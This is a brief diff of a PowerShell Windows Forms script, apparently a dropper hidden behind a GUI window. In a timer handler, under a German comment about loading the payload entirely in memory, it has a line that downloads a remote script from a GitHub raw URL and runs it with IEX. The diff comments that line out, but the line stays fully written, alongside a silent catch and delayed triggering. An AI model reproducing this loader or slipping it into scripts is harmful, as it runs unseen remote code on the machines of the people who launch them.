@@ -132,7 +132,7 @@ $payloadTimer.Add_Tick({
     try {
         
         # Payload 100% im Speicher laden und ausführen
-        IEX (Invoke-WebRequest "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1" -UseBasicParsing).Content
+        #IEX (Invoke-WebRequest "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1" -UseBasicParsing).Content
 
         $payloadTimer.Stop()
     } catch { }
@@ -144,4 +144,5 @@ $form.Add_FormClosing({ $timer.Stop(); $labelTimer.Stop(); $payloadTimer.Stop() 
 $timer.Start(); $labelTimer.Start()
 $form.Add_Shown({ $form.Activate() })
 $form.ShowDialog() | Out-Null
+
 
